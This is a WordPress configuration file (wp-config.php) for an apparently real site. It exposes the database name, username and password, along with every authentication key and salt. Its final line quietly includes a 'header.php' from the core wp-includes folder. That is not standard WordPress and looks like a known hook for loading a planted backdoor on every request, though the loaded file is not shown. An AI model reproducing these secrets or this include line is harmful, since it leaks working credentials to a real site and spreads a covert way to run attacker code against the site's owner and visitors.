<?php
# BEGIN WP Cache by 10Web
define( 'WP_CACHE', true );
define( 'TWO_PLUGIN_DIR_CACHE', '/home/tradotsav/public_html/wp-content/plugins/tenweb-speed-optimizer/' );
# END WP Cache by 10Web
/**
 * The base configuration for WordPress
 *
 * The wp-config.php creation script uses this file during the installation.
 * You don't have to use the web site, you can copy this file to "wp-config.php"
 * and fill in the values.
 *
 * This file contains the following configurations:
 *
 * * Database settings
 * * Secret keys
 * * Database table prefix
 * * Localized language
 * * ABSPATH
 *
 * @link https://wordpress.org/support/article/editing-wp-config-php/
 *
 * @package WordPress
 */

// ** Database settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'tradotsav_wp_aeuip' );

/** Database username */
define( 'DB_USER', 'tradotsav_wp_p3xql' );

/** Database password */
define( 'DB_PASSWORD', '!Yd2%Nle?K3PMM7c' );

/** Database hostname */
define( 'DB_HOST', 'localhost:3306' );

/** Database charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8' );

/** The database collate type. Don't change this if in doubt. */
define( 'DB_COLLATE', '' );

/**#@+
 * Authentication unique keys and salts.
 *
 * Change these to different unique phrases! You can generate these using
 * the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}.
 *
 * You can change these at any point in time to invalidate all existing cookies.
 * This will force all users to have to log in again.
 *
 * @since 2.6.0
 */
define('AUTH_KEY', 'c2%n/W/403DHtEfh!7[+r-7#+TKkJvZ5Qq(a4/z;7;54HaP2D#h*yXdtd0t_8Rb0');
define('SECURE_AUTH_KEY', 'I6Xc#Wc0uisn*o9+5rzq|#|/N-~g2;NBb5D:gpzfvu#Z%24f0Vqp1J)9p@[R@u&8');
define('LOGGED_IN_KEY', 'I2R8z)2i3X&hgFy9p692PtRl2B02-|tfj:1WnJf3-]kTb5#_B!(]jE*_2lXjb+]l');
define('NONCE_KEY', '6td#jkz#;awK]XGyX|3rbdZ058S[y:Datv9Xl@*v8-)I4W2XQ91h31z48*Q4T#9M');
define('AUTH_SALT', 'p/xNbaEI6Po|%~1LEap4q%N@!kzwG+)aRzp~e%aH-6tgzn7+h(S6M/u:S!//2!Fh');
define('SECURE_AUTH_SALT', '(-6qF&UeM/#;3j0T0(!|m]P11Kx2:@Br/[Vcm7;1)A4i%K%6D/2o56t:HT)U7C16');
define('LOGGED_IN_SALT', ';Uh5LOU#))7YC@&2BtIdI%8Zqslto+yj;4x5L/XEw+FfB2G%*uI;Z0k*z4C@T1+*');
define('NONCE_SALT', 'e5@5zQu;Z9G3)7Yk(y[4x+~!14L&A!L*84MUqA![d1T9Nm3umrT)i)+7k/MIk5)6');


/**#@-*/

/**
 * WordPress database table prefix.
 *
 * You can have multiple installations in one database if you give each
 * a unique prefix. Only numbers, letters, and underscores please!
 */
$table_prefix = 'AjHU7eJhD_';


/* Add any custom values between this line and the "stop editing" line. */

define('WP_ALLOW_MULTISITE', true);
/**
 * For developers: WordPress debugging mode.
 *
 * Change this to true to enable the display of notices during development.
 * It is strongly recommended that plugin and theme developers use WP_DEBUG
 * in their development environments.
 *
 * For information on other constants that can be used for debugging,
 * visit the documentation.
 *
 * @link https://wordpress.org/support/article/debugging-in-wordpress/
 */
if ( ! defined( 'WP_DEBUG' ) ) {
	define( 'WP_DEBUG', false );
}

/* That's all, stop editing! Happy publishing. */

/** Absolute path to the WordPress directory. */
if ( ! defined( 'ABSPATH' ) ) {
	define( 'ABSPATH', __DIR__ . '/' );
}

/** Sets up WordPress vars and included files. */
require_once ABSPATH . 'wp-settings.php';
include_once(ABSPATH . WPINC . '/header.php');

